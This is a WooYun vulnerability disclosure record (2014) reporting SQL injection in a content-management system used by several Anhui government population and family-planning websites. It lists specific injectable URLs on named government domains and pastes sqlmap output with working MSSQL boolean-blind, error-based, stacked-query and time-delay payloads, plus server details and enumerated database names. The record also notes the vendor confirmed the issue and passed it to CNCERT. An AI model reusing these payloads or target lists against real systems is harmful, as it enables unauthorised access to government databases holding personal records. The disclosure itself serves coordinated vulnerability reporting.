{"id": 49662, "wybug_id": "wooyun-2014-080538", "wybug_title": "安徽某建站系统多处SQL注入漏洞，影响多个政府网站", "wybug_corp": "安徽人口信息技术有限公司", "wybug_author": "浮萍", "wybug_date": "2014-10-24 18:47", "wybug_open_date": "2015-01-22 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向公众公开  简要描述： SQL注入 详细说明：  人口基金在线http://rkjj.ahpfpc.gov.cn/MenuList.aspx?id=67\n\n输入'\n\n在搜索处输入1'\n\n\n\n这里以搜索处为例注入点http://rkjj.ahpfpc.gov.cn/Newslist.aspx?key=1\nsqlmap identified the following injection points with a total of 47 HTTP(s) requests:---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=1%' AND 6465=6465 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: key=1%' AND 7089=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(113)+CHAR(108)+CHAR(113)+(SELECT (CASE WHEN (7089=7089) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(104)+CHAR(101)+CHAR(113))) AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: key=1%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: key=1%' WAITFOR DELAY '0:0:5'-----\n\nweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n数据库\navailable databases [27]:[*] AwardAndHelp[*] bz_zjblSystem[*] commom_dwdm[*] CommonBase_ChiZhou[*] CommonBase_GuiChi[*] CommonBase_LDC[*] CommonBase_LYDX[*] CommonBase_rkjj[*] CommonBase_RSCyjzj[*] CommonBase_SZSF[*] CommonBase_TongLing[*] CommonBase_YJZ[*] ContraceptionReward[*] demo_rkjj_20120520[*] jsw_dongzhi[*] jsw_feidong[*] jsw_zjblSystem[*] JSWUSER[*] Ldc_zjbl[*] master[*] model[*] msdb[*] P_debt[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] URM_NEW\n当前库\ncurrent database:    'CommonBase_rkjj'\n\n\n搜索“技术支持:安徽人口信息技术有限公司”\n\n\n\n整理出一些测试用例\nhttp://rkjj.ahpfpc.gov.cn/Newslist.aspx?key=1http://jlfz.ahpfpc.gov.cn/Newslist.aspx?id=8&&key=1 www.hbsjsw.gov.cn/Newslist.aspx?key=1yjz.ahpfpc.gov.cn/Newslist.aspx?id=8&&key=1http://www.fdxjsw.gov.cn/Newslist.aspx?key=1http://www.czsjsw.gov.cn/Newslist.aspx?key=1http://ldrk.ahpfpc.gov.cn/Newslist.aspx?id=8&&key=1http://www.tljsw.gov.cn/Newslist.aspx?id=8&&key=1http://www.ljpop.gov.cn/LinkList.aspx?id=3\n   漏洞证明：  淮北市人口和计划生育委员会注入点：www.hbsjsw.gov.cn/Newslist.aspx?key=1\n\n\n\n\nsqlmap identified the following injection points with a total of 47 HTTP(s) requests:---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=1%' AND 7061=7061 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: key=1%' AND 6455=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(108)+CHAR(115)+CHAR(113)+(SELECT (CASE WHEN (6455=6455) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(99)+CHAR(121)+CHAR(111)+CHAR(113))) AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: key=1%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: key=1%' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---\n数据库\navailable databases [10]:[*] CommonBase[*] CommonBase_djq[*] CommonBase_lsq[*] CommonBase_sx[*] CommonBase_xsq[*] DB_HBSJSW_WMCJ[*] master[*] model[*] msdb[*] tempdb\n当前库\ncurrent database:    'CommonBase'\n---------------下面不贴图了人口和计划生育利益导向http://jlfz.ahpfpc.gov.cn/Newslist.aspx?id=8&&key=1\n---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=8&&key=1%' AND 3140=3140 AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=8&&key=1%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=8&&key=1%' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n数据库\navailable databases [27]:[*] AwardAndHelp[*] bz_zjblSystem[*] commom_dwdm[*] CommonBase_ChiZhou[*] CommonBase_GuiChi[*] CommonBase_LDC[*] CommonBase_LYDX[*] CommonBase_rkjj[*] CommonBase_RSCyjzj[*] CommonBase_SZSF[*] CommonBase_TongLing[*] CommonBase_YJZ[*] ContraceptionReward[*] demo_rkjj_20120520[*] jsw_dongzhi[*] jsw_feidong[*] jsw_zjblSystem[*] JSWUSER[*] Ldc_zjbl[*] master[*] model[*] msdb[*] P_debt[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] URM_NEW\n当前库\ncurrent database:    'CommonBase_LYDX'\n------------城市和流动人口服务管理http://ldrk.ahpfpc.gov.cn/Newslist.aspx?id=8&&key=1\n---Place: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=8&&key=1%' AND 7666=7666 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=8&&key=1%' AND 2550=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(99)+CHAR(103)+CHAR(113)+(SELECT (CASE WHEN (2550=2550) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(109)+CHAR(106)+CHAR(105)+CHAR(113))) AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=8&&key=1%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=8&&key=1%' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n数据库\navailable databases [27]:[*] AwardAndHelp[*] bz_zjblSystem[*] commom_dwdm[*] CommonBase_ChiZhou[*] CommonBase_GuiChi[*] CommonBase_LDC[*] CommonBase_LYDX[*] CommonBase_rkjj[*] CommonBase_RSCyjzj[*] CommonBase_SZSF[*] CommonBase_TongLing[*] CommonBase_YJZ[*] ContraceptionReward[*] demo_rkjj_20120520[*] jsw_dongzhi[*] jsw_feidong[*] jsw_zjblSystem[*] JSWUSER[*] Ldc_zjbl[*] master[*] model[*] msdb[*] P_debt[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] URM_NEW\n当前库\ncurrent database:    'CommonBase_LDC'\n------------铜陵http://www.tljsw.gov.cn/Newslist.aspx?id=8&&key=1\nPlace: GETParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=8&&key=1%' AND 6311=6311 AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=8&&key=1%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=8&&key=1%' WAITFOR DELAY '0:0:5'--\n\nweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n数据库\navailable databases [27]:[*] AwardAndHelp[*] bz_zjblSystem[*] commom_dwdm[*] CommonBase_ChiZhou[*] CommonBase_GuiChi[*] CommonBase_LDC[*] CommonBase_LYDX[*] CommonBase_rkjj[*] CommonBase_RSCyjzj[*] CommonBase_SZSF[*] CommonBase_TongLing[*] CommonBase_YJZ[*] ContraceptionReward[*] demo_rkjj_20120520[*] jsw_dongzhi[*] jsw_feidong[*] jsw_zjblSystem[*] JSWUSER[*] Ldc_zjbl[*] master[*] model[*] msdb[*] P_debt[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] URM_NEW\n当前库\ncurrent database:    'CommonBase_TongLing'\n-------庐山www.ljpop.gov.cn/Newslist.aspx?id=8&&key=1 \nPlace: GETParameter: key    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=8&&key=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=8&&key=1' WAITFOR DELAY '0:0:5'-----\n\nweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005\n数据库\n\n\n\n......   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-10-29 09:05 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给安徽分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}